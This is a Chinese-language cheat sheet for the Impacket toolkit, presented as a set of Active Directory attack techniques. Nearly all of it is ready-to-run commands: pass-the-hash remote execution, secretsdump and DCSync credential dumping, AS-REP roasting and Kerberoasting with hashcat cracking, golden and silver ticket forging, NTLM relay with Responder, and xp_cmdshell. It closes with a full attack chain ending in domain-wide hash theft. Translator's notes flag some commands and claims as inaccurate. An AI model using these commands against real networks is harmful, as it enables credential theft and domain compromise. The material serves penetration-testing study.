# 🐍 Impacket — Python AD 攻击工具集

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
                    Python 网络协议工具集
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

## 📋 目录

- [什么是 Impacket](#-what-is-impacket)
- [安装](#-installation)
- [远程执行](#-remote-execution)
- [凭据导出](#-credential-dumping)
- [Kerberos 攻击](#-kerberos-attacks)
- [SMB 攻击](#-smb-attacks)
- [MSSQL 攻击](#-mssql-attacks)
- [LDAP/AD 查询](#-ldapad-queries)
- [快速参考](#-quick-reference)

---

<a id="-what-is-impacket"></a>

## 🎯 什么是 Impacket

**Impacket** 是一套用于处理网络协议的 Python 类库，常用于 Active Directory（AD，活动目录）攻击：

- 🎫 **Kerberos** — AS-REP Roasting／Kerberoasting、票据攻击
- 💻 **远程执行** — psexec, wmiexec, smbexec, atexec
- 🔓 **凭据导出** — secretsdump, DCSync
- 📁 **SMB** — 文件操作、中继
- 🗄️ **MSSQL** — 数据库攻击

### 主要工具

| 工具 | 说明 |
|------|-------------|
| **psexec.py** | 通过 SMB 远程执行 |
| **wmiexec.py** | 通过 WMI 远程执行 |
| **secretsdump.py** | 导出凭据／哈希 |
| **GetNPUsers.py** | AS-REP Roasting（获取可供离线破解的 AS-REP 数据） |
| **GetUserSPNs.py** | Kerberoasting（获取服务票据供离线破解） |
| **ntlmrelayx.py** | NTLM 中继攻击 |
| **smbclient.py** | SMB 客户端 |
| **mssqlclient.py** | MSSQL 客户端 |

---

<a id="-installation"></a>

## 🚀 安装

### Kali Linux

```bash
# Kali 中已预装
impacket-psexec --help

# 或安装／更新
pip3 install impacket
pip3 install impacket --upgrade
```

### 从 GitHub 安装

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# 或采用开发模式安装
pip3 install -e .
```

> **译注：**`impacket-*` 命令名常见于发行版打包，Python 包安装后的脚本名可能不同；安装方式见 [官方仓库](https://github.com/fortra/impacket)。下方 `impacket.__version__` 也不能视为稳定的版本查询接口，当前 [`__init__.py`](https://github.com/fortra/impacket/blob/master/impacket/__init__.py)并未定义该属性。原命令保留。

### 验证安装

```bash
# 检查安装
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

<a id="-remote-execution"></a>

## 💻 远程执行

### psexec.py

```bash
# 使用密码
impacket-psexec domain.local/user:password@10.10.10.10

# 使用 NTLM 哈希（Pass-the-Hash）
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# 本地管理员
impacket-psexec administrator:password@10.10.10.10

# 执行命令
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# 指定共享目录
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

> **译注：**上面的 `-target-ip` 指定目标机器的连接 IP，不是选择 SMB 共享目录，见 [psexec 源码参数说明](https://github.com/fortra/impacket/blob/master/examples/psexec.py)。文中的“更隐蔽”和汇总表的等级仅是粗略比较，不能视为不会留下痕迹或不会被检测的保证。

### wmiexec.py

```bash
# 比 psexec 更隐蔽
impacket-wmiexec domain.local/user:password@10.10.10.10

# 使用哈希
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# 执行命令
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# 不返回输出（静默）
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### smbexec.py

```bash
# 通过 SMB 执行
impacket-smbexec domain.local/user:password@10.10.10.10

# 使用哈希
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# 指定共享目录
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

### atexec.py

```bash
# 使用任务计划程序
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# 使用哈希
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

### dcomexec.py

```bash
# 使用 DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# 不同的 DCOM 对象
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

<a id="-credential-dumping"></a>

## 🔓 凭据导出

### secretsdump.py

```bash
# 从远程主机导出
impacket-secretsdump domain.local/user:password@10.10.10.10

# 使用哈希导出（PtH）
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# 从 DC 导出（DCSync）
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# 仅对指定用户执行 DCSync
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# 仅提取 NTLM 哈希（不含 Kerberos 密钥）
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# 输出到文件
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

### DCSync 攻击

```bash
# 完整 DCSync（导出整个 AD 数据库）
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# 对指定用户执行 DCSync
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# 对 krbtgt 执行 DCSync（用于黄金票据）
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# 输出格式：user:RID:LM:NTLM:::
```

> **译注：**DCSync 示例通过复制协议提取所需的账号哈希／Kerberos 密钥，并非下载整个 AD 数据库及所有属性；`-just-dc` 也不表示任意用户都能获得这些数据，仍需相应权限。参见 [secretsdump 实现与选项](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)。原注释中的“整个数据库”是简化表述。

### 从本地文件提取

```bash
# 从 NTDS.dit + SYSTEM 提取
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# 从 SAM + SYSTEM 提取
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# 从 SECURITY + SYSTEM 提取（LSA 机密）
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

<a id="-kerberos-attacks"></a>

## 🎫 Kerberos 攻击

### AS-REP Roasting（GetNPUsers.py）

```bash
# 查找不要求预身份验证的用户
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 使用凭据
impacket-GetNPUsers domain.local/user:password -request

# 指定 DC IP
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# 输出到文件
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# 使用 hashcat 格式
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# 使用 john 格式
impacket-GetNPUsers domain.local/user:password -request -format john
```

### Kerberoasting（GetUserSPNs.py）

```bash
# 查找可进行 Kerberoasting 的用户
impacket-GetUserSPNs domain.local/user:password

# 请求 TGS 票据
impacket-GetUserSPNs domain.local/user:password -request

# 输出到文件
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# DC IP
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# 使用哈希
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

### 破解 Kerberos 哈希

```bash
# AS-REP（hashcat 模式 18200）
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast（hashcat 模式 13100）
hashcat -m 13100 kerberoast.txt wordlist.txt

# 使用 john
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

> **译注：**上面的 Hashcat 模式 18200／13100 分别对应 etype 23 的 AS-REP／TGS-REP，并非所有 Kerberos 加密类型的通用模式；应结合实际输出类型理解，参见 [官方模式示例](https://hashcat.net/wiki/doku.php?id=example_hashes)。原命令保留。

### getTGT.py

```bash
# 使用密码请求 TGT
impacket-getTGT domain.local/user:password

# 使用哈希请求 TGT
impacket-getTGT domain.local/user -hashes :NTLMHASH

# 使用 AES 密钥请求 TGT
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# 保存到 user.ccache
# 导出环境变量以供使用：
export KRB5CCNAME=user.ccache
```

### ticketer.py（黄金／白银票据）

```bash
# 黄金票据
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# 白银票据
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# 使用票据
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

> **译注：**上面的白银票据指定了 `MSSQLSvc/target.domain.local:1433` 服务，而后续 `psexec` 使用 SMB，不能把它当作该 SQL 服务票据的直接通用使用方式。这是依据 [SMB Kerberos 实现中的 cifs 服务请求](https://github.com/fortra/impacket/blob/master/impacket/smb3.py)作出的解释；黄金票据与白银票据的适用范围不同，原始示例保持不变。

<a id="-smb-attacks"></a>

## 📁 SMB 攻击

### smbclient.py

```bash
# 连接到共享目录
impacket-smbclient domain.local/user:password@10.10.10.10

# 列出共享目录
# （在 smbclient 内）
shares

# 连接到指定共享目录
use SHARE_NAME

# 列出文件
ls

# 下载文件
get filename

# 上传文件
put localfile

# 执行命令
# （如果对某个共享目录有写权限）
```

### smbserver.py

```bash
# 启动 SMB 服务器（用于数据外传）
impacket-smbserver share /tmp/share

# 启用身份验证
impacket-smbserver share /tmp/share -username user -password pass

# 支持 SMB2
impacket-smbserver share /tmp/share -smb2support
```

### ntlmrelayx.py

```bash
# 基本中继
impacket-ntlmrelayx -tf targets.txt

# 中继到 SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# 中继并执行命令
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# 中继后导出 SAM
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# 中继到 LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# 配合 Responder：
# 1. 编辑 Responder.conf，设置 SMB = Off, HTTP = Off
# 2. 运行：responder -I eth0
# 3. 运行：impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

> **译注：**当前 [`ntlmrelayx` 参数定义](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)没有上文的 `--sam` 开关；具体行为还取决于目标、权限及协议防护，不能把中继命令视为必然成功。原示例保留供版本对照。

<a id="-mssql-attacks"></a>

## 🗄️ MSSQL 攻击

### mssqlclient.py

```bash
# 使用 Windows 身份验证连接
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# 使用 SQL 身份验证连接
impacket-mssqlclient sa:password@10.10.10.10

# 使用哈希
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# 连接到指定数据库
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

### MSSQL 命令

```sql
-- 启用 xp_cmdshell
enable_xp_cmdshell

-- 执行命令
xp_cmdshell whoami

-- SQL 查询
SELECT * FROM master.sys.databases

-- 读取文件
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

> **译注：**上方代码块虽标为 SQL，但 `enable_xp_cmdshell` 与 `xp_cmdshell whoami` 是 Impacket `mssqlclient` 的交互式辅助命令，并非可原样交给任意 SQL 客户端的完整 T-SQL 语句，参见 [SQLSHELL 实现](https://github.com/fortra/impacket/blob/master/impacket/examples/mssqlshell.py)。原代码保留。

<a id="-ldapad-queries"></a>

## 📂 LDAP/AD 查询

### GetADUsers.py

```bash
# 列出所有用户
impacket-GetADUsers domain.local/user:password -all

# 指定 DC
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# 使用哈希
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

### lookupsid.py

```bash
# 通过 SID 穷举枚举用户
impacket-lookupsid domain.local/user:password@10.10.10.10

# 指定 SID 范围
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

### findDelegation.py

```bash
# 查找委派配置
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

<a id="-quick-reference"></a>

## 📊 快速参考

### 身份验证选项

| 选项 | 说明 |
|--------|-------------|
| `user:password` | 密码身份验证 |
| `-hashes :NTLM` | NTLM 哈希（Pass-the-Hash，哈希传递） |
| `-hashes LM:NTLM` | LM:NTLM 哈希 |
| `-aesKey KEY` | AES256 密钥 |
| `-k -no-pass` | 使用 ccache 的 Kerberos 身份验证 |

> **译注：**`-aesKey` 在相应工具中可接受 128 或 256 位 AES 密钥，并非只接受 AES256，参见 [认证参数定义](https://github.com/fortra/impacket/blob/master/examples/psexec.py)。原表保留供对照。

### 常用选项

| 选项 | 说明 |
|--------|-------------|
| `-dc-ip IP` | 域控制器 IP |
| `-target-ip IP` | 目标 IP |
| `-debug` | 启用调试输出 |

### 远程执行汇总

| 工具 | 方式 | 隐蔽性 |
|------|--------|---------|
| psexec.py | SMB + 服务 | 低 |
| wmiexec.py | WMI | 中 |
| smbexec.py | SMB | 低 |
| atexec.py | 任务计划程序 | 高 |
| dcomexec.py | DCOM | 中 |

### 攻击流程

> **译注：**下方流程前两步未指定输出文件，不会仅凭这些命令自动生成后续使用的 `asrep.txt`／`kerberoast.txt`。原文前面的独立示例提供了 `-outputfile` 参数；本流程仍按原样保留。

```bash
# 1. 枚举用户（AS-REP Roast）
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. 执行 Kerberoast
impacket-GetUserSPNs domain.local/user:password -request

# 3. 破解哈希
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. 使用 PtH 或密码
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. 导出凭据
impacket-secretsdump domain.local/admin:password@DC01

# 6. 通过 DCSync 获取所有哈希
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

## 📚 参考资料

- [Impacket GitHub](https://github.com/fortra/impacket)
- [Impacket 示例](https://github.com/fortra/impacket/tree/master/examples)
- [维基](https://github.com/fortra/impacket/wiki)

### 相关速查表
- [BloodHound](../../BloodHound/README.md)
- [Mimikatz](../../Mimikatz/README.md)
- [Hashcat](../../Hashcat/README.md)

---

<p align="center">
  <b>🐍 使用 Python 掌握 AD 攻击技术！</b><br>
  <i>Impacket — 渗透测试人员的必备工具集</i>
</p>
